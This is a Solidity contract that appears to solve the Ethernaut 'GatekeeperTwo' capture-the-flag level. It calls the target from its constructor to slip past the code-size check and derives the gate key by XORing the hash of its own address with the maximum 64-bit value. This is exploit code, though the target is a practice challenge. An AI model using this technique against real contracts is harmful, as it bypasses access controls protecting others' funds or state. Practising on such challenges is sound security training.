// SPDX-License-Identifier: MIT

pragma solidity 0.8.19;

interface GatekeeperTwo {
  function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwoHack {
  event Completed(bool success);

  constructor(GatekeeperTwo gatekeeperTwo) {
    bytes8 key = bytes8(keccak256(abi.encodePacked(address(this)))) ^ bytes8(type(uint64).max);
    bool ok = gatekeeperTwo.enter(key);

    emit Completed(ok);

    require(ok, 'failed');
  }
}